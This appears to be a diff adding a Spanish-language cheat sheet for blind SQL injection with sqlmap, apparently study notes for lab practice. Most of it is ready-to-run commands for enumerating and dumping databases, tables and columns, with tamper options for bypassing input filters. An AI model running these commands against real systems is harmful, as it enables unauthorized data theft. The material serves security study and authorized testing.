@@ -1,0 +1,142 @@
+=====================================================
+        SQLMAP - BLIND INJECTIONS CHEATSHEET
+=====================================================
+
+=== TECNICAS ===
+
+B = Boolean-based blind
+T = Time-based blind
+U = Union-based
+E = Error-based
+S = Stacked queries
+
+--technique=B      Solo boolean blind
+--technique=T      Solo time-based
+--technique=BT     Boolean + Time
+
+
+=== COMANDOS BASICOS ===
+
+Boolean blind:
+sqlmap -u "URL?id=1" --technique=B --dbs
+
+Time-based:
+sqlmap -u "URL?id=1" --technique=T --dbs
+
+Ambos:
+sqlmap -u "URL?id=1" --technique=BT --dbs
+
+
+=== TIME-BASED - AJUSTAR TIEMPOS ===
+
+--time-sec=5       Segundos de delay (default: 5)
+--time-sec=10      Subir si hay lag en red
+
+Ejemplo:
+sqlmap -u "URL?id=1" --technique=T --time-sec=10 --dbs
+
+
+=== FLUJO COMPLETO ===
+
+1. Detectar y listar BDs:
+sqlmap -u "URL?id=1" --technique=B --dbs
+
+2. Listar tablas de una BD:
+sqlmap -u "URL?id=1" --technique=B -D nombre_bd --tables
+
+3. Listar columnas de una tabla:
+sqlmap -u "URL?id=1" --technique=B -D nombre_bd -T tabla --columns
+
+4. Extraer datos:
+sqlmap -u "URL?id=1" --technique=B -D nombre_bd -T tabla -C col1,col2 --dump
+
+5. Dump completo de tabla:
+sqlmap -u "URL?id=1" --technique=B -D nombre_bd -T tabla --dump
+
+
+=== FLAGS UTILES ===
+
+--level=2          Mas pruebas (1-5, default 1)
+--level=3          Prueba cookies, user-agent
+--level=5          Prueba todo
+
+--risk=2           Payloads mas agresivos (1-3, default 1)
+--risk=3           Incluye OR (puede modificar datos)
+
+--string="texto"   Texto que aparece cuando TRUE
+--not-string="x"   Texto que aparece cuando FALSE
+--code=200         Codigo HTTP cuando TRUE
+
+--threads=10       Hilos paralelos (acelera blind)
+
+--dbms=mysql       Forzar DBMS (mysql, mssql, oracle, pgsql)
+
+
+=== BYPASS FILTROS ===
+
+--tamper=space2comment        Espacios -> /**/
+--tamper=space2hash           Espacios -> %23%0a
+--tamper=space2morehash       Variante
+--tamper=space2mssqlblank     Para MSSQL
+--tamper=space2plus           Espacios -> +
+--tamper=space2randomblank    Espacios aleatorios
+
+--tamper=between              > -> BETWEEN
+--tamper=equaltolike          = -> LIKE
+--tamper=randomcase           MaYuScUlAs random
+
+Combinar tampers:
+--tamper=space2comment,randomcase,between
+
+
+=== CON COOKIES / POST ===
+
+Con cookie:
+sqlmap -u "URL?id=1" --cookie="PHPSESSID=abc123" --technique=B --dbs
+
+POST data:
+sqlmap -u "URL" --data="user=admin&pass=123" --technique=B --dbs
+
+Parametro especifico:
+sqlmap -u "URL" --data="user=admin&pass=123" -p user --technique=B --dbs
+
+
+=== PROXY / VERBOSIDAD ===
+
+--proxy=http://127.0.0.1:8080     Pasar por Burp
+-v 3                              Ver payloads enviados
+-v 4                              Ver requests HTTP
+-v 5                              Ver headers completos
+
+
+=== EJEMPLOS PRACTICOS ===
+
+Blind boolean basico:
+sqlmap -u "http://target/page?id=1" --technique=B --dbs
+
+Blind time con delay alto:
+sqlmap -u "http://target/page?id=1" --technique=T --time-sec=10 --dbs
+
+Blind con bypass espacios:
+sqlmap -u "http://target/page?id=1" --technique=B --tamper=space2comment --dbs
+
+Blind agresivo (mas pruebas):
+sqlmap -u "http://target/page?id=1" --technique=BT --level=3 --risk=2 --dbs
+
+Blind rapido con hilos:
+sqlmap -u "http://target/page?id=1" --technique=B --threads=10 --dbs
+
+Dump completo con blind:
+sqlmap -u "http://target/page?id=1" --technique=B -D ejercicios -T users --dump
+
+
+=== NOTAS ===
+
+- Blind es LENTO, paciencia
+- --threads acelera pero puede causar falsos positivos
+- Si no detecta, subir --level y --risk
+- Usa --string o --code si sqlmap no distingue TRUE/FALSE
+- Time-based es mas lento que boolean, usar solo si boolean falla
+
+
+=====================================================
